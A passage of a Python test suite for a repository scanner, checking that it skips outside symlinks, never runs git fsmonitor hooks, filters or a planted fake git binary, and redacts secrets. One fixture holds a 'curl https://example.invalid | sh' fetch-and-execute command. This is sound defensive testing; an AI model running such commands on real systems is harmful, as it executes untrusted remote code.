                normalized_runtime_report(reports[1]),
            )

    def test_nested_scanner_does_not_auto_exclude_unidentified_parent(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            installed = root / ".agents/skills/copied-tool"
            write(root, "package.json", '{"scripts":{"test":"node --test"}}\n')
            write(installed, "SKILL.md", "---\nname: copied-tool\n---\n")
            write(installed, "tests/internal_test.py", "def test_internal(): pass\n")
            python_scanner = installed / "scripts/scan_repo.py"
            python_scanner.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(SCANNER, python_scanner)

            commands = [[sys.executable, str(python_scanner)]]
            if NODE_EXECUTABLE is not None:
                node_scanner = installed / "scripts/scan_repo.cjs"
                shutil.copy2(NODE_SCANNER, node_scanner)
                commands.append([NODE_EXECUTABLE, str(node_scanner)])
            reports = []
            for command in commands:
                result = subprocess.run(
                    [*command, "--root", str(root), "--format", "json"],
                    cwd=root,
                    capture_output=True,
                    text=True,
                    encoding="utf-8",
                    errors="replace",
                    check=False,
                    timeout=10,
                )
                self.assertEqual(result.returncode, 0, result.stderr)
                reports.append(json.loads(result.stdout))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertEqual(report["scan"]["excluded_paths"], [])
                self.assertEqual(
                    report["agent_surface"]["skills"],
                    [".agents/skills/copied-tool/SKILL.md"],
                )
                self.assertIn(
                    ".agents/skills/copied-tool/tests/internal_test.py",
                    report["verification"]["test_paths"],
                )

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    def test_excluded_directory_cannot_reenter_through_file_symlink(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            excluded_manifest = write(
                root,
                "bootstrap/package.json",
                '{"scripts":{"test":"node --test"}}\n',
            )
            alias = root / "alias/package.json"
            alias.parent.mkdir()
            try:
                alias.symlink_to(excluded_manifest)
            except OSError as error:
                self.skipTest(f"file symlinks unavailable: {error}")

            reports = [scan(root, "--exclude-path", "bootstrap")]
            if NODE_EXECUTABLE is not None:
                reports.append(
                    scan_with_node(root, "--exclude-path", "bootstrap")
                )

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertEqual(report["project"]["manifests"], [])
                self.assertEqual(report["project"]["ecosystems"], [])
                self.assertIn("alias/package.json", report["scan"]["skipped_symlinks"])

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    def test_exclusion_matches_filesystem_identity_on_case_insensitive_hosts(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            actual = root / "Bootstrap"
            write(actual, "package.json", '{}\n')
            differently_cased = root / "bootstrap"
            try:
                same_identity = differently_cased.exists() and os.path.samefile(
                    actual, differently_cased
                )
            except OSError:
                same_identity = False
            if not same_identity:
                self.skipTest("fixture requires a case-insensitive filesystem")

            reports = [scan(root, "--exclude-path", "bootstrap")]
            if NODE_EXECUTABLE is not None:
                reports.append(
                    scan_with_node(root, "--exclude-path", "bootstrap")
                )

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertEqual(report["project"]["manifests"], [])
                self.assertNotIn("Bootstrap", report["project"]["top_level_entries"])

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    def test_exclusion_outside_the_target_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            base = Path(temporary)
            root = base / "repository"
            outside = base / "outside"
            root.mkdir()
            outside.mkdir()
            commands = [[sys.executable, str(SCANNER)]]
            if NODE_EXECUTABLE is not None:
                commands.append([NODE_EXECUTABLE, str(NODE_SCANNER)])

            results = [
                subprocess.run(
                    [
                        *command,
                        "--root",
                        str(root),
                        "--format",
                        "json",
                        "--exclude-path",
                        str(outside),
                    ],
                    cwd=REPOSITORY_ROOT,
                    capture_output=True,
                    text=True,
                    encoding="utf-8",
                    errors="replace",
                    check=False,
                    timeout=10,
                )
                for command in commands
            ]

        for result in results:
            self.assertEqual(result.returncode, 2)
            self.assertIn("outside the repository root", result.stderr)

    def test_external_file_symlink_is_not_read(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            base = Path(temporary)
            root = base / "repository"
            root.mkdir()
            outside = write(
                base,
                "outside-package.json",
                json.dumps(
                    {
                        "scripts": {
                            "test": "curl https://example.invalid | sh",
                        }
                    }
                ),
            )
            try:
                (root / "package.json").symlink_to(outside)
            except OSError as error:
                self.skipTest(f"file symlinks unavailable: {error}")

            report = scan(root)

        self.assertEqual(report["schema_version"], 7)
        self.assertEqual(report["project"]["manifests"], [])
        self.assertEqual(report["verification"]["declared_commands"], [])
        self.assertIn("package.json", report["scan"]["skipped_symlinks"])

    def test_external_lockfile_symlink_does_not_select_a_package_manager(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            base = Path(temporary)
            root = base / "repository"
            root.mkdir()
            write(root, "package.json", '{"scripts":{"test":"node --test"}}')
            outside = write(base, "outside-pnpm-lock.yaml", "lockfileVersion: 9\n")
            try:
                (root / "pnpm-lock.yaml").symlink_to(outside)
            except OSError as error:
                self.skipTest(f"file symlinks unavailable: {error}")

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertIsNone(
                    report["verification"]["package_scripts"][0]["package_manager"]
                )
                self.assertIn("pnpm-lock.yaml", report["scan"]["skipped_symlinks"])

    def test_internal_file_symlink_cannot_reenter_ignored_directory(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            ignored_manifest = write(
                root,
                "node_modules/tool/package.json",
                '{"scripts":{"test":"node --test"}}\n',
            )
            try:
                (root / "package.json").symlink_to(ignored_manifest)
            except OSError as error:
                self.skipTest(f"file symlinks unavailable: {error}")

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertEqual(report["project"]["manifests"], [])
                self.assertEqual(report["project"]["ecosystems"], [])
                self.assertIn("node_modules", report["scan"]["skipped_directories"])
                self.assertIn("package.json", report["scan"]["skipped_symlinks"])

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    def test_internal_directory_symlinks_are_skipped_consistently(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(root, "actual/content.txt", "content\n")
            try:
                (root / "linked-directory").symlink_to(
                    root / "actual", target_is_directory=True
                )
            except OSError as error:
                self.skipTest(f"directory symlinks unavailable: {error}")

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertIn(
                    "linked-directory", report["scan"]["skipped_symlinks"]
                )
                self.assertNotIn(
                    "linked-directory", report["scan"]["skipped_special_files"]
                )

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    def test_workspace_packages_inherit_the_nearest_scanned_lockfile(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(root, "pnpm-lock.yaml", "lockfileVersion: 9\n")
            write(root, "packages/api/package-lock.json", "{}\n")
            write(
                root,
                "packages/api/package.json",
                '{"scripts":{"test":"node --test"}}\n',
            )
            write(
                root,
                "packages/web/package.json",
                '{"scripts":{"test":"node --test"}}\n',
            )

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertEqual(
                    {
                        item["source"]: item["package_manager"]
                        for item in report["verification"]["package_scripts"]
                    },
                    {
                        "packages/api/package.json": "npm",
                        "packages/web/package.json": "pnpm",
                    },
                )

    def test_nonstandard_json_constants_are_rejected_consistently(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(root, "package.json", '{"scripts": NaN}\n')

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertEqual(report["verification"]["package_scripts"], [])
                self.assertIn(
                    "Unable to parse package.json: invalid JSON",
                    report["scan"]["warnings"],
                )
                self.assertIn(
                    "declared_verification_command_detection_incomplete",
                    report["diagnostic_hints"],
                )
                self.assertNotIn(
                    "no_declared_verification_command_detected",
                    report["diagnostic_hints"],
                )

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    @unittest.skipIf(os.name == "nt", "POSIX permissions are required")
    def test_unreadable_directory_makes_absence_detection_incomplete(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            restricted = root / "restricted"
            write(restricted, "AGENTS.md", "# Hidden by permissions\n")
            write(restricted, "package.json", '{"scripts":{"test":"node --test"}}\n')
            write(restricted, ".github/workflows/ci.yml", "name: CI\n")
            restricted.chmod(0)
            try:
                reports = [scan(root)]
                markdown_reports = [
                    markdown_with([sys.executable, str(SCANNER)], root)
                ]
                if NODE_EXECUTABLE is not None:
                    reports.append(scan_with_node(root))
                    markdown_reports.append(
                        markdown_with([NODE_EXECUTABLE, str(NODE_SCANNER)], root)
                    )
            finally:
                restricted.chmod(0o700)

        if not reports[0]["scan"]["warnings"]:
            self.skipTest("The current user can read mode-000 directories")

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertTrue(report["scan"]["traversal_incomplete"])
                self.assertIn(
                    "repository_inventory_incomplete", report["diagnostic_hints"]
                )
                self.assertNotIn("empty_repository", report["diagnostic_hints"])
                self.assertIn(
                    "agent_instruction_surface_detection_incomplete",
                    report["diagnostic_hints"],
                )
                self.assertIn(
                    "declared_verification_command_detection_incomplete",
                    report["diagnostic_hints"],
                )
                self.assertIn(
                    "ci_configuration_detection_incomplete",
                    report["diagnostic_hints"],
                )

        for markdown in markdown_reports:
            self.assertIn("Traversal incomplete: True", markdown)
            self.assertIn("detection was incomplete", markdown)
            self.assertIn(
                "Declared verification-command detection is incomplete", markdown
            )

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    def test_taskfile_targets_use_the_task_runner(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(
                root,
                "Taskfile.yml",
                "version: '3'\n"
                "tasks:\n"
                "  test:\n"
                "    desc: Run tests\n"
                "    cmds:\n"
                "      - go test ./...\n"
                "  lint:\n"
                "    cmds:\n"
                "      - golangci-lint run\n",
            )

            reports = [scan(root)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(root))

        expected = [
            {
                "source": "Taskfile.yml",
                "runner": "task",
                "targets": ["lint", "test"],
                "targets_total": 2,
            }
        ]
        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertEqual(report["verification"]["task_targets"], expected)
                self.assertEqual(
                    {
                        command["name"]: command["definition"]
                        for command in report["verification"]["declared_commands"]
                    },
                    {"lint": "task", "test": "task"},
                )

    @unittest.skipUnless(GIT_EXECUTABLE is not None, "Git is unavailable")
    def test_git_metadata_is_scoped_to_the_requested_subdirectory(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            repository = Path(temporary) / "repository"
            target = repository / "target"
            repository.mkdir()
            write(repository, "target/文 件.txt", "before\n")
            write(repository, "sibling/外 部.txt", "before\n")

            def git(*arguments: str) -> None:
                subprocess.run(
                    [GIT_EXECUTABLE, "-C", str(repository), *arguments],
                    capture_output=True,
                    text=True,
                    check=True,
                )

            git("init", "-q")
            git("add", ".")
            git(
                "-c",
                "commit.gpgsign=false",
                "-c",
                "user.name=Agentize Skill Test",
                "-c",
                "user.email=agentize-skill@example.invalid",
                "commit",
                "-qm",
                "baseline",
            )
            write(repository, "target/文 件.txt", "after\n")
            write(repository, "sibling/外 部.txt", "after\n")

            python_report = scan(target)
            node_report = scan_with_node(target) if NODE_EXECUTABLE is not None else None

        metadata = python_report["version_control"]
        self.assertEqual(Path(metadata["root"]), repository.resolve())
        self.assertFalse(metadata["target_matches_git_root"])
        self.assertEqual(metadata["worktree_state"], "unverified")
        self.assertIsNone(metadata["dirty_path_count"])
        self.assertEqual(metadata["dirty_paths"], [])
        self.assertNotIn("外 部.txt", json.dumps(metadata, ensure_ascii=False))
        self.assertIn(
            "git_worktree_state_unverified", python_report["diagnostic_hints"]
        )
        if node_report is not None:
            self.assertEqual(
                normalized_runtime_report(python_report),
                normalized_runtime_report(node_report),
            )

    @unittest.skipUnless(GIT_EXECUTABLE is not None, "Git is unavailable")
    def test_git_inventory_does_not_execute_repository_fsmonitor(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            repository = Path(temporary) / "repository"
            repository.mkdir()
            marker = repository / "fsmonitor-executed"
            hook = write(
                repository,
                "fsmonitor.sh",
                "#!/bin/sh\n"
                f"printf executed > {shlex.quote(str(marker))}\n",
            )
            hook.chmod(0o755)
            write(repository, "tracked.txt", "content\n")

            def git(*arguments: str) -> None:
                subprocess.run(
                    [GIT_EXECUTABLE, "-C", str(repository), *arguments],
                    capture_output=True,
                    text=True,
                    check=True,
                )

            git("init", "-q")
            git("add", "tracked.txt")
            git("config", "core.fsmonitor", str(hook))

            scanners = [("python", lambda: scan(repository))]
            if NODE_EXECUTABLE is not None:
                scanners.append(("node", lambda: scan_with_node(repository)))
            executed = []
            for implementation, run_scan in scanners:
                if marker.exists():
                    marker.unlink()
                run_scan()
                executed.append((implementation, marker.exists()))

        self.assertEqual(executed, [(name, False) for name, _ in executed])

    @unittest.skipIf(os.name == "nt", "POSIX executable fixture is required")
    def test_git_inventory_rejects_an_executable_inside_the_target(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            repository = Path(temporary) / "repository"
            repository.mkdir()
            (repository / ".git").mkdir()
            marker = repository / "fake-git-executed"
            fake_git = write(
                repository,
                "git",
                "#!/bin/sh\n"
                f"printf executed > {shlex.quote(str(marker))}\n"
                "exit 0\n",
            )
            fake_git.chmod(0o755)
            environment = os.environ.copy()
            environment["PATH"] = (
                str(repository)
                + os.pathsep
                + environment.get("PATH", "")
            )

            reports = [scan(repository, environment=environment)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(repository, environment=environment))
            marker_executed = marker.exists()

        self.assertFalse(marker_executed)
        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertIsNone(report["version_control"]["is_repository"])
                self.assertEqual(
                    report["version_control"]["repository_state_reason"],
                    "git_executable_inside_target",
                )
                self.assertIn(
                    "git_repository_identity_unverified",
                    report["diagnostic_hints"],
                )

        if len(reports) == 2:
            self.assertEqual(
                normalized_runtime_report(reports[0]),
                normalized_runtime_report(reports[1]),
            )

    @unittest.skipUnless(
        GIT_EXECUTABLE is not None and os.name != "nt",
        "Git filter fixture requires a POSIX command environment",
    )
    def test_git_inventory_does_not_execute_clean_or_process_filters(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            base = Path(temporary)
            reports = []
            for filter_kind in ("clean", "process"):
                repository = base / f"repository-{filter_kind}"
                repository.mkdir()
                marker = base / f"{filter_kind}-filter-executed"
                filter_program = write(
                    base,
                    f"{filter_kind}-filter.py",
                    "from pathlib import Path\n"
                    f"Path({str(marker)!r}).write_text("
                    "'executed', encoding='utf-8')\n"
                    "raise SystemExit(23)\n",
                )
                write(
                    repository,
                    ".gitattributes",
                    "tracked.txt filter=review-filter\n",
                )
                tracked = write(repository, "tracked.txt", "content\n")

                def git(*arguments: str) -> None:
                    subprocess.run(
                        [GIT_EXECUTABLE, "-C", str(repository), *arguments],
                        capture_output=True,
                        text=True,
                        check=True,
                    )

                git("init", "-q")
                git("config", "user.name", "Fixture Author")
                git("config", "user.email", "fixture@example.invalid")
                git("add", ".gitattributes", "tracked.txt")
                git("commit", "-q", "-m", "initial")
                filter_command = (
                    f"{shlex.quote(sys.executable)} "
                    f"{shlex.quote(str(filter_program))}"
                )
                git(
                    "config",
                    f"filter.review-filter.{filter_kind}",
                    filter_command,
                )
                git("config", "filter.review-filter.required", "true")
                stat = tracked.stat()
                os.utime(
                    tracked,
                    ns=(stat.st_atime_ns, stat.st_mtime_ns + 2_000_000_000),
                )

                scanners = [("python", lambda: scan(repository))]
                if NODE_EXECUTABLE is not None:
                    scanners.append(("node", lambda: scan_with_node(repository)))
                for implementation, run_scan in scanners:
                    if marker.exists():
                        marker.unlink()
                    report = run_scan()
                    reports.append(
                        (filter_kind, implementation, report, marker.exists())
                    )

        for filter_kind, implementation, report, filter_executed in reports:
            with self.subTest(filter=filter_kind, implementation=implementation):
                self.assertFalse(filter_executed)
                self.assertEqual(
                    report["version_control"]["worktree_state"], "unverified"
                )
                self.assertIsNone(
                    report["version_control"].get("dirty_path_count")
                )

    @unittest.skipUnless(GIT_EXECUTABLE is not None, "Git is unavailable")
    def test_git_inventory_ignores_inherited_repository_selectors(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            base = Path(temporary)
            repositories = [base / "repository-a", base / "repository-b"]
            for index, repository in enumerate(repositories):
                repository.mkdir()
                write(repository, f"tracked-{index}.txt", "content\n")
                subprocess.run(
                    [GIT_EXECUTABLE, "-C", str(repository), "init", "-q"],
                    check=True,
                )
            repository_a, repository_b = repositories
            environment = os.environ.copy()
            environment.update(
                {
                    "GIT_DIR": str(repository_b / ".git"),
                    "GIT_WORK_TREE": str(repository_b),
                    "GIT_COMMON_DIR": str(repository_b / ".git"),
                    "GIT_INDEX_FILE": str(repository_b / ".git" / "index"),
                    "GIT_OBJECT_DIRECTORY": str(repository_b / ".git" / "objects"),
                    "GIT_CONFIG_COUNT": "1",
                    "GIT_CONFIG_KEY_0": "core.worktree",
                    "GIT_CONFIG_VALUE_0": str(repository_b),
                }
            )

            commands = [
                [sys.executable, str(SCANNER)],
                *(
                    [[NODE_EXECUTABLE, str(NODE_SCANNER)]]
                    if NODE_EXECUTABLE is not None
                    else []
                ),
            ]
            reports = []
            for command in commands:
                result = subprocess.run(
                    [
                        *command,
                        "--root",
                        str(repository_a),
                        "--format",
                        "json",
                    ],
                    cwd=REPOSITORY_ROOT,
                    env=environment,
                    capture_output=True,
                    text=True,
                    check=True,
                )
                reports.append(json.loads(result.stdout))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                self.assertEqual(
                    Path(report["version_control"]["root"]), repository_a.resolve()
                )
                self.assertTrue(
                    report["version_control"]["target_matches_git_root"]
                )

    @unittest.skipUnless(GIT_EXECUTABLE is not None, "Git is unavailable")
    def test_git_repository_is_unverified_when_git_is_unavailable(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            base = Path(temporary)
            repository = base / "repository"
            unavailable_path = base / "empty-path"
            repository.mkdir()
            unavailable_path.mkdir()
            subprocess.run(
                [GIT_EXECUTABLE, "-C", str(repository), "init", "-q"],
                check=True,
            )
            environment = os.environ.copy()
            environment["PATH"] = str(unavailable_path)

            reports = [scan(repository, environment=environment)]
            if NODE_EXECUTABLE is not None:
                reports.append(
                    scan_with_node(repository, environment=environment)
                )

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                metadata = report["version_control"]
                self.assertEqual(report["schema_version"], 7)
                self.assertIsNone(metadata["is_repository"])
                self.assertEqual(metadata["repository_state"], "unverified")
                self.assertEqual(
                    metadata["repository_state_reason"],
                    "git_executable_unavailable",
                )
                self.assertEqual(metadata["worktree_state"], "unverified")
                self.assertIn(
                    "git_repository_identity_unverified",
                    report["diagnostic_hints"],
                )

    @unittest.skipUnless(GIT_EXECUTABLE is not None, "Git is unavailable")
    def test_git_repository_is_unverified_when_config_is_invalid(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            repository = Path(temporary) / "repository"
            repository.mkdir()
            subprocess.run(
                [GIT_EXECUTABLE, "-C", str(repository), "init", "-q"],
                check=True,
            )
            (repository / ".git" / "config").write_text(
                "[invalid\n", encoding="utf-8"
            )

            reports = [scan(repository)]
            if NODE_EXECUTABLE is not None:
                reports.append(scan_with_node(repository))

        for report in reports:
            with self.subTest(implementation=report["scan"]["implementation"]):
                metadata = report["version_control"]
                self.assertEqual(report["schema_version"], 7)
                self.assertIsNone(metadata["is_repository"])
                self.assertEqual(metadata["repository_state"], "unverified")
                self.assertEqual(
                    metadata["repository_state_reason"],
                    "git_identity_query_failed",
                )
                self.assertEqual(metadata["worktree_state"], "unverified")

    def test_standalone_skill_and_openai_metadata_are_visible(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write(
                root,
                "SKILL.md",
                "---\nname: example\ndescription: Example skill.\n---\n",
            )
            write(
                root,
                "agents/openai.yaml",
                'interface:\n  display_name: "Example"\n',
            )

            report = scan(root)

        self.assertEqual(report["agent_surface"]["skills"], ["SKILL.md"])
        self.assertEqual(report["agent_surface"]["config"], ["agents/openai.yaml"])

    @unittest.skipUnless(
        NODE_EXECUTABLE is not None and NODE_SCANNER.is_file(),
        "Node.js scanner is unavailable",
    )
    def test_python_and_node_scanners_have_semantic_parity(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            base = Path(temporary)
            root = base / "示例 repository"
            root.mkdir()
            write(
                root,
                "AGENTS.md",
                "# Guidance\n\n"
                "See [architecture](docs/architecture%20overview.md), "
                "[missing](docs/missing.md), [outside](../outside.md), "
                "[linked outside](docs/external.md), and "
                "[malformed](docs/%FF.md), and [loop](docs/loop.md).\n\n"
                "```text\n"
                "API_TOKEN=document-secret python -m unittest discover "
                "-s tests -v\n"
                "```\n",
            )
            write(root, "AGENTS.override.md", "# API_KEY=heading-secret\n")
            write(root, "packages/api/AGENTS.local.md", "# Local API guidance\n")
            write(root, "packages/web/CLAUDE.local.md", "# Local Claude guidance\n")
            write(root, "docs/architecture overview.md", "# Architecture\n")
            write(root, "docs/runbook.md", "# Runbook\n")
            write(
                root,
                "package.json",
                json.dumps(
                    {
                        "name": "parity-project",
                        "scripts": {
                            "test:unit": "node --test",
                            "test:secret": (
                                "API_TOKEN=script-secret "
                                "AWS_SECRET_ACCESS_KEY=aws-secret "
                                "GH_PAT=pat-secret "
                                "AUTHORIZATION=Basic-basic-secret node --test "
                                "--password password-secret "
                                "--header 'Authorization: Bearer bearer-secret' "
                                "https://user:password@example.invalid"
                            ),
                            "typecheck": "tsc --noEmit",
                            "start": "node src/index.js",
                        },
                    }
                ),
            )
            write(root, "pnpm-lock.yaml", "lockfileVersion: 9\n")
            write(
                root,
                "pyproject.toml",
                "[project]\n"
                'name = "parity-project"\n'
                "[project.scripts]\n"
                'demo = "demo.cli:main"\n'
                "'check-tool' = 'demo.check:main'\n",
            )
            write(root, "Makefile", "test:\n\t@echo ok\nbuild-app:\n\t@echo build\n")
            write(root, "Justfile", "lint:\n    echo lint\n")
            write(root, ".github/workflows/ci.yml", "name: CI\n")
            write(root, ".gemini/settings.json", "{}\n")
            write(root, ".agents/skills/example/SKILL.md", "---\nname: example\n---\n")
            write(root, "src/功能.ts", "export const value = 1;\n")
            write(root, "tests/功能.test.ts", "// test\n")
            write(root, "vendor/ignored.js", "// vendored\n")
            write(root, "broken/package.json", "{not-json}\n")
            write(root, "array/package.json", "[]\n")
            outside = write(base, "outside-package.json", '{"scripts":{"test":"unsafe"}}')
            outside_document = write(base, "outside.md", "# Outside\n")
            try:
                (root / "external-package.json").symlink_to(outside)
                (root / "docs/external.md").symlink_to(outside_document)
                (root / "docs/loop.md").symlink_to("loop.md")
                nested = root / "nested"
                nested.mkdir()
                (nested / "AGENTS.md").symlink_to(root / "AGENTS.md")
            except OSError:
                pass

            python_report = scan(root)
            node_report = scan_with_node(root)
            python_markdown = markdown_with(
                [sys.executable, str(SCANNER)],
                root,
            )
            node_markdown = markdown_with(
                [NODE_EXECUTABLE, str(NODE_SCANNER)],
                root,
            )
            additional_reports = [
                (extra, scan(root, *extra), scan_with_node(root, *extra))
                for extra in (("--include-vendored",), ("--max-files", "5"))
            ]

        self.assertEqual(python_report["scan"]["implementation"], "python")
        self.assertEqual(node_report["scan"]["implementation"], "node")
        self.assertEqual(
            normalized_runtime_report(python_report),
            normalized_runtime_report(node_report),
        )
        serialized_report = json.dumps(python_report)
        self.assertNotIn("heading-secret", serialized_report)
        self.assertNotIn("script-secret", serialized_report)
        self.assertNotIn("document-secret", serialized_report)
        self.assertNotIn("aws-secret", serialized_report)
        self.assertNotIn("pat-secret", serialized_report)
        self.assertNotIn("basic-secret", serialized_report)
        self.assertNotIn("bearer-secret", serialized_report)
        self.assertNotIn("password-secret", serialized_report)
        self.assertNotIn("user:password", serialized_report)
        self.assertIn("<redacted>", serialized_report)
        root_instruction = next(
            instruction
            for instruction in python_report["agent_surface"]["instructions"]
            if instruction["path"] == "AGENTS.md"
        )
        self.assertIn(
            "docs/%FF.md", root_instruction["broken_relative_links"]
        )
        self.assertIn("docs/loop.md", root_instruction["broken_relative_links"])
        self.assertIn(
            "docs/external.md",
            root_instruction["relative_links_outside_repository"],
        )
        self.assertEqual(python_markdown, node_markdown)
        for extra, python_extra, node_extra in additional_reports:
            with self.subTest(extra=extra):
                self.assertEqual(
                    normalized_runtime_report(python_extra),
                    normalized_runtime_report(node_extra),
                )


if __name__ == "__main__":
    unittest.main()
